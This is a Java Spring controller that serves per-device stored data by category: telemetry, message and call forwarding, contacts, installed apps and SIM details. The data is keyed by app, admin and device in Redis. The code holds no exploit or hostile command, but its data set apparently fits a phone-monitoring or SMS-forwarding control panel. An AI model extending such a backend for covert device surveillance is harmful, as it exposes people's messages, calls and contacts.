package com.admingateway.web;

import com.admingateway.security.SessionValidator;
import com.fasterxml.jackson.databind.JsonNode;
import com.fasterxml.jackson.databind.ObjectMapper;
import org.springframework.http.ResponseEntity;
import org.springframework.web.bind.annotation.*;

import java.util.*;

@RestController
@RequestMapping("/state")
public class AggregatedStateController {
    private static final String TELEMETRY = "telemetry";
    private static final String MESSAGE_FORWARD = "messageforward";
    private static final String CALL_FORWARD = "callforward";
    private static final java.util.Set<String> APPS_KEYS = java.util.Set.of("app", "apps", "installedapp", "installedapps");
    private static final java.util.Set<String> SIM_KEYS = java.util.Set.of("sim", "sims", "siminfo", "simslot");
    private final SessionValidator sessionValidator;
    private final org.springframework.data.redis.core.StringRedisTemplate redis;
    private final ObjectMapper mapper;

    public AggregatedStateController(SessionValidator sessionValidator, org.springframework.data.redis.core.StringRedisTemplate redis, ObjectMapper mapper) {
        this.sessionValidator = sessionValidator;
        this.redis = redis;
        this.mapper = mapper;
    }

    // Fetch a single category JSON for a device (uses session to resolve app/admin)
    @GetMapping("/{category}")
    public ResponseEntity<String> getCategory(@CookieValue(value = "asid", required = false) String asid,
                                              @RequestHeader(value = "X-Session-Id", required = false) String sidHeader,
                                              @PathVariable("category") String category,
                                              @RequestParam(value = "deviceId", required = false) String deviceId) {
        String sid = (sidHeader != null && !sidHeader.isBlank()) ? sidHeader : asid;
        var sess = sessionValidator.validate(sid);
        if (!sess.active()) return ResponseEntity.status(401).build();
        if (deviceId == null || deviceId.isBlank()) {
            return ResponseEntity.badRequest()
                    .header("Content-Type", "application/json")
                    .body(jsonError("missing_device", "Query parameter 'deviceId' is required."));
        }
        String baseKey = deviceKey(sess.appId(), sess.adminId(), deviceId);
        String normalized = normalize(category);
        String json = resolveCategoryJson(baseKey, category, normalized);
        if (json == null || json.isBlank()) json = emptyJson(category, normalized);
        return ResponseEntity.ok().header("Content-Type", "application/json").body(json);
    }

    // List deviceIds that have any stored category for this admin/app
    @GetMapping("/devices")
    public ResponseEntity<Map<String, Object>> listDevices(@CookieValue(value = "asid", required = false) String asid,
                                                           @RequestHeader(value = "X-Session-Id", required = false) String sidHeader) {
        String sid = (sidHeader != null && !sidHeader.isBlank()) ? sidHeader : asid;
        var sess = sessionValidator.validate(sid);
        if (!sess.active()) return ResponseEntity.status(401).build();
        String prefix = "app:" + safe(sess.appId()) + ":" + safe(sess.adminId()) + ":";
        Set<String> deviceIds = new HashSet<>();
        scanKeys(prefix + "*").forEach(k -> {
            String rest = k.substring(prefix.length());
            int sep = rest.indexOf(':');
            if (sep > 0) deviceIds.add(rest.substring(0, sep));
        });
        Map<String, Object> out = new HashMap<>();
        out.put("items", deviceIds);
        out.put("count", deviceIds.size());
        return ResponseEntity.ok(out);
    }

    private List<String> scanKeys(String pattern) {
        List<String> keys = new ArrayList<>();
        redis.execute((org.springframework.data.redis.core.RedisCallback<Void>) connection -> {
            var scanOptions = org.springframework.data.redis.core.ScanOptions.scanOptions().match(pattern).count(1000).build();
            var keyCommands = connection.keyCommands();
            if (keyCommands == null) return null;
            try (var cursor = keyCommands.scan(scanOptions)) {
                while (cursor.hasNext()) {
                    keys.add(new String(cursor.next()));
                }
            } catch (Exception e) {
                // Ignore scan interruption; missing keys simply mean fewer deviceIds in the response.
            }
            return null;
        });
        return keys;
    }

    private static String deviceKey(String appId, String adminId, String deviceId) {
    return "app:" + safe(appId) + ":" + safe(adminId) + ":" + safe(deviceId);
    }

    private static String safe(String s) { return s == null ? "" : s; }

    private static String normalize(String raw) {
        if (raw == null) return "";
        String lower = raw.toLowerCase(Locale.ROOT).trim();
        lower = lower.replaceAll("[^a-z0-9]", "");
        if (lower.endsWith("ies")) lower = lower.substring(0, lower.length() - 3) + "y";
        if (lower.endsWith("s") && lower.length() > 1 && !lower.endsWith("sms")) {
            lower = lower.substring(0, lower.length() - 1);
        }
        if ("contact".equals(lower)) return "contact";
        if (TELEMETRY.equals(lower)) return TELEMETRY;
        if (lower.startsWith(MESSAGE_FORWARD)) return MESSAGE_FORWARD;
        if (lower.startsWith(CALL_FORWARD)) return CALL_FORWARD;
        return lower;
    }

    private String resolveCategoryJson(String baseKey, String requestedCategory, String normalized) {
    String candidate = firstNonBlank(
                fetchField(baseKey, requestedCategory),
                fetchField(baseKey, normalized),
                pluralVariant(baseKey, normalized)
        );
        if (candidate != null) return candidate;
    String byNormalized = findByNormalized(baseKey, normalized);
    if (byNormalized != null) return byNormalized;
    return deriveFromTelemetry(baseKey, requestedCategory, normalized);
    }

    private String fetchField(String baseKey, String field) {
        if (field == null || field.isBlank()) return null;
        Object val = redis.opsForHash().get(baseKey, field);
        return val != null ? val.toString() : null;
    }

    private String pluralVariant(String baseKey, String normalized) {
        if (normalized == null || normalized.isBlank() || normalized.endsWith("s")) return null;
        return fetchField(baseKey, normalized + "s");
    }

    private String findByNormalized(String baseKey, String normalized) {
        java.util.Map<Object,Object> entries = redis.opsForHash().entries(baseKey);
        if (entries.isEmpty()) return null;
        for (var entry : entries.entrySet()) {
            String field = java.util.Objects.toString(entry.getKey(), "");
            String fieldNorm = normalize(field);
            if (fieldNorm.isEmpty()) continue;
            if (fieldNorm.equals(normalized)
                    || fieldNorm.startsWith(normalized)
                    || normalized.startsWith(fieldNorm)) {
                return java.util.Objects.toString(entry.getValue(), "");
            }
        }
        return null;
    }

    private static String firstNonBlank(String... values) {
        if (values == null) return null;
        for (String v : values) {
            if (v != null && !v.isBlank()) return v;
        }
        return null;
    }

    private String deriveFromTelemetry(String baseKey, String requestedCategory, String normalized) {
        if (!needsTelemetryFallback(normalized)) return null;
        String telemetryJson = fetchField(baseKey, TELEMETRY);
        if (telemetryJson == null || telemetryJson.isBlank()) return null;
        try {
            JsonNode root = mapper.readTree(telemetryJson);
            if (isAppsCategory(requestedCategory, normalized)) {
                JsonNode arr = root.path("installedApps");
                if (!arr.isArray()) return "[]";
                return arr.toString();
            }
            if (isSimCategory(requestedCategory, normalized)) {
                JsonNode arr = root.path("sims");
                if (!arr.isArray()) return "[]";
                return arr.toString();
            }
        } catch (Exception ignored) {
            // fall through to let caller return default empty response when telemetry JSON cannot be parsed
        }
        return null;
    }

    private static boolean needsTelemetryFallback(String normalized) {
        return APPS_KEYS.contains(normalized) || SIM_KEYS.contains(normalized);
    }

    private static boolean isAppsCategory(String rawCategory, String normalized) {
        String normRaw = normalize(rawCategory);
        return APPS_KEYS.contains(normalized) || APPS_KEYS.contains(normRaw);
    }

    private static boolean isSimCategory(String rawCategory, String normalized) {
        String normRaw = normalize(rawCategory);
        return SIM_KEYS.contains(normalized) || SIM_KEYS.contains(normRaw);
    }

    private static String emptyJson(String rawCategory, String normalized) {
        if (isAppsCategory(rawCategory, normalized) || isSimCategory(rawCategory, normalized)) {
            return "[]";
        }
        if (TELEMETRY.equals(normalized)) return "{}";
        return "[]";
    }

    private static String jsonError(String code, String message) {
        return "{\"error\":\"" + code + "\",\"message\":\"" + message.replace("\"", "\\\"") + "\"}";
    }
}
